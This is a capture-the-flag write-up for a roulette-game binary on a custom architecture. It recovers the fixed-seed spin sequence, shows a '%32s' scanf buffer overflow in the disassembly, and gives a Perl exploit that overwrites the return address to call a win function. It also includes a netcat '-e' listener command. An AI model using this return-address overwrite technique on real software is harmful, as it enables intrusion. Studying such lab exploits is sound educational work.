# Binary exploit 2

We're given a [Femtium](femtium-notes.md) binary, that implements a roulette
style game, but with a [fixed random seed](https://xkcd.com/221/), so the spins
are going to be the same with every invocation of the game.

First of all, we can write a program to play the game to obtain the fixed
sequence of winning spins, which will allow us to get a high score.

Rather than trying to build perl for Fenix, I set up a port forward on the host
VM, and a netcat listener on Fenix, so I could interact with the binary over
the network.

```
root@sphinx:/# sysctl net.ipv4.conf.all.forwarding=1
root@sphinx:/# iptables -t nat -A PREROUTING  -i enp0s3 -p tcp --dport 1234 -j DNAT --to-destination 10.42.0.2
root@sphinx:/# iptables -t nat -A POSTROUTING -o fenix                      -j SNAT --to-source      10.42.0.1

johnny@sphinx # nc -l -p 1234 -e ./binexp2
```

I wrote the following perl script to record the sequence of winning spins:

```perl
#!/usr/bin/perl

use IO::Socket::INET;

my $S = new IO::Socket::INET(PeerAddr => "10.0.0.90:1234") or die("$!\n");

my @seq = ();
my @new = ();

while (defined($line = $S->getline()) && scalar(@new) <= (207-50)) {
	print($line);
	if ($line =~ /^3> Exit/) {
		$S->printf("1 %d\r\n", shift(@seq) // 0);
	}
	elsif ($line =~ /^The ball landed on \.\.\. (\d+) \.\.\./) {
		push(@new, $1);
	}

}

print("my \@seq = (", join(", ", @new), ");\n");
```

With every invocation, it records as much of the sequence as it can, up to a
maximum of 157, since that's the amount of correct guesses we need from the
beginning in order to get a high score. The first time it's run, it knows
nothing about the winning sequence, and always guesses 0. Since we start with a
balance of $50 and either gain or lose $1 with every spin, the first round will
play slightly more than 50 times (because some times the fixed 0 guess will be
correct), and it will have learned what those outcomes are. At the end, it
prints out a new `my @seq = (...)` line that can replace the former one in the
script, and the script can be re-run again to obtain more information.

After a few iterations, the final winning sequence that we'll need is this:

```perl
my @seq = (0, 1, 27, 31, 10, 26, 18, 9, 29, 24, 15, 30, 11, 22, 34, 29, 1, 2, 19, 19, 35, 14, 9, 17, 33, 7, 5, 20, 14, 17, 27, 31, 23, 15, 18, 20, 24, 22, 15, 16, 9, 22, 26, 7, 33, 15, 23, 1, 29, 4, 30, 5, 9, 14, 6, 4, 25, 29, 0, 30, 28, 13, 15, 14, 27, 5, 13, 2, 26, 26, 16, 16, 9, 32, 1, 16, 3, 15, 12, 0, 9, 18, 4, 18, 3, 27, 7, 19, 33, 28, 31, 35, 26, 17, 8, 30, 15, 8, 8, 15, 8, 11, 17, 11, 29, 15, 12, 14, 29, 23, 5, 27, 9, 5, 19, 24, 13, 15, 12, 27, 29, 2, 25, 32, 8, 34, 5, 1, 23, 18, 3, 16, 14, 3, 22, 34, 32, 13, 31, 7, 3, 12, 2, 15, 25, 7, 34, 25, 11, 11, 16, 30, 8, 20, 24, 22, 10, 26);
```

Now, what do we do once we get on the high score list? The program will print
out "You got a new highscore!" and ask for our name for the high score list.
The binary is not stripped, so it's easy to find the various functions in it.
Let's examine the disassembly of the setHighscore function:

```
00402418: 47df00d0  add     sp, sp,zz,-48       ; Prologue
0040241c: 377f002c  stw     ra, [sp+44]         ; Save return address
00402420: 379f0028  stw     fp, [sp+40]         ; Save frame pointer
00402424: 479f0030  add     fp, sp,zz,48        ; Establish new frame pointer

00402428: 83c071a0  movi    t0, 0x0000038d      ; STRING: "You got a new highscore!"
0040242c: 8bc00036  addi    t0, 0x00400000
00402430: 406f0000  mov     a0, t0
00402434: 477f800c  add     ra, ip,zz,12        ; call
00402438: 87209222  movi    at0, 0x00001244     ; ...
0040243c: 8f200000  addi    at0, 0x00000000     ; ...
00402440: 47fff200  jmp     ip+at0              ; printf

00402444: 83c04f20  movi    t0, 0x00000279      ; STRING: "Enter your name:"
00402448: 8bc00036  addi    t0, 0x00400000
0040244c: 307e00e4  stw     a0, [fp-28]
00402450: 406f0000  mov     a0, t0
00402454: 477f800c  add     ra, ip,zz,12	; call
00402458: 87209122  movi    at0, 0x00001224	; ...
0040245c: 8f200000  addi    at0, 0x00000000	; ...
00402460: 47fff200  jmp     ip+at0              ; printf

00402464: 83c017a2  movi    t0, 0x000002f4      ; STRING: "%32s"
00402468: 8bc00036  addi    t0, 0x00400000
0040246c: 409e00e8  add     a1, fp,zz,-24       ; arg 1 = address of string buffer, fp-24
00402470: 307e00e0  stw     a0, [fp-32]
00402474: 406f0000  mov     a0, t0		; arg 0 = address of "%32s"
00402478: 477f800c  add     ra, ip,zz,12        ; call
0040247c: 872092a2  movi    at0, 0x00001254     ; ...
00402480: 8f200000  addi    at0, 0x00000000     ; ...
00402484: 47fff200  jmp     ip+at0              ; scanf

00402488: 307e00dc  stw     a0, [fp-36]         ; Save scanf return value, although it's never used

0040248c: 179f0028  ldw     fp, [sp+40]		; Epilogue
00402490: 177f002c  ldw     ra, [sp+44]
00402494: 47df0030  add     sp, sp,zz,48
00402498: 47fd8000  ret
```

That is a classic buffer overflow. The code calls scanf with an input buffer
that is not big enough to hold the amount of data it may receive. In this case,
the "%32s" input string allows 32 bytes of input, but the let's take a look at
the relevant portion of the stack frame of this function.

During the prologue, the stack pointer is decremented by 48 to make room for
local variables. The return address and frame pointer registers must be
preserved, so they are saved to the stack. This is done at sp+44 and sp+40,
respectively, but it's easier to think in terms of the frame pointer which is
later initialized back to sp+48, or to the same as what sp was when the
function started executing. In other words, the frame pointer is stored to fp-8
and return address to fp-4:

```
fp-4	Saved return address
fp-8	Saved frame pointer
fp-12
fp-16
fp-20
fp-24	Start of scanf string buffer
```

The buffer given to scanf starts at fp-24, but there is only room for 16 bytes
of data in that buffer before an overrun would overwrite first the frame
pointer, then the return address, and then the previous stack frame.

Since we control the input to the name prompt, we can use this to overwrite the
return address. When asked for the player's name, we simply have to supply 16
bytes of dummy name data, followed by the values we want to put into the frame
pointer and return address.

A quick look at the symbol table reveals a `win` function at address 004023a0,
and the disassembly of that function has references to "./binexp2_flag", so
that sounds pretty relevant. The value we choose to overwrite the saved frame
pointer with is not relevant, as we'll never end up returning back to the
previously saved frame anyway. With this in mind, we can write the following
exploit script:

```perl
#!/usr/bin/perl

use IO::Socket::INET;

my $S = new IO::Socket::INET(PeerAddr => "10.0.0.90:1234") or die("$!\n");

my @seq=(
	0, 1, 27, 31, 10, 26, 18, 9, 29, 24, 15, 30, 11, 22, 34, 29, 1, 2, 19,
	19, 35, 14, 9, 17, 33, 7, 5, 20, 14, 17, 27, 31, 23, 15, 18, 20, 24, 22,
	15, 16, 9, 22, 26, 7, 33, 15, 23, 1, 29, 4, 30, 5, 9, 14, 6, 4, 25, 29,
	0, 30, 28, 13, 15, 14, 27, 5, 13, 2, 26, 26, 16, 16, 9, 32, 1, 16, 3,
	15, 12, 0, 9, 18, 4, 18, 3, 27, 7, 19, 33, 28, 31, 35, 26, 17, 8, 30,
	15, 8, 8, 15, 8, 11, 17, 11, 29, 15, 12, 14, 29, 23, 5, 27, 9, 5, 19,
	24, 13, 15, 12, 27, 29, 2, 25, 32, 8, 34, 5, 1, 23, 18, 3, 16, 14, 3,
	22, 34, 32, 13, 31, 7, 3, 12, 2, 15, 25, 7, 34, 25, 11, 11, 16, 30, 8,
	20, 24, 22, 10, 26);

# Play the game
$S->print(join(" ", map { (1, $_) } @seq), "\r\n");

# Deliver exploit
#
#           --- Buffer ---  -FramePointer-  Return Address
#          /              \/              \/              \
$S->print("AAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x40\x23\xa0\r\n");

while (defined($line = $S->getline())) {
	print($line) if $line =~ /FE{/;
}
```

Running that script plays the game, overwrites the return address, which causes
the win function to be called, binexp2_flag to be executed, and the flag to be
displayed.


## Flag

`FE{You_beat_the_C4sin0_and_pwned_it_for_good_measure}`


---
_Peter Tirsek, 2020-01-20_
